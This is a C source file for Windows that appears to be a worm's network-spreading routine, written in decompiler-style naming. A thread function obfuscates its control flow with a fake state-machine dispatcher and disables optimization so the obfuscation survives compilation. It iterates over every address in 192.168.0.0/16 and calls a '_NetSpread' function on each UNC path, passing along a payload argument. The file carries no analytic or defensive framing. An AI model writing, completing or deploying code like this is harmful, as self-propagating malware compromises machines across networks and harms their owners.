#include "data_globals.h"
#include <string.h>
#include <stdio.h>
#include <stdbool.h>

#pragma optimize("", off)
DWORD WINAPI _L0cal_4(LPVOID Data)
{
    volatile int dummy_state = 1;
    char local_54[64];
    uint32_t local_14;
    uint32_t local_10;
    LPCSTR param_1 = (LPCSTR)Data;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 5) goto dummy_state_5;
    if (dummy_state == 6) goto dummy_state_6;
    if (dummy_state == 7) goto dummy_state_7;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    local_10 = 0;
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    if (local_10 < 0x100) {
        dummy_state = 3;
        goto dummy_dispatcher;
    }
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_state_3:
    local_14 = 0;
    dummy_state = 4;
    goto dummy_dispatcher;

dummy_state_4:
    if (local_14 < 0x100) {
        dummy_state = 5;
        goto dummy_dispatcher;
    }
    dummy_state = 6;
    goto dummy_dispatcher;

dummy_state_5:
    memset(local_54, 0, sizeof(local_54));
    sprintf(local_54, "\\\\192.168.%d.%d", local_10, local_14);
    _NetSpread((uint32_t)local_54, param_1);
    dummy_state = 7;
    goto dummy_dispatcher;

dummy_state_6:
    local_10++;
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_7:
    local_14++;
    dummy_state = 4;
    goto dummy_dispatcher;

dummy_end:
    return 0;
}
#pragma optimize("", on)
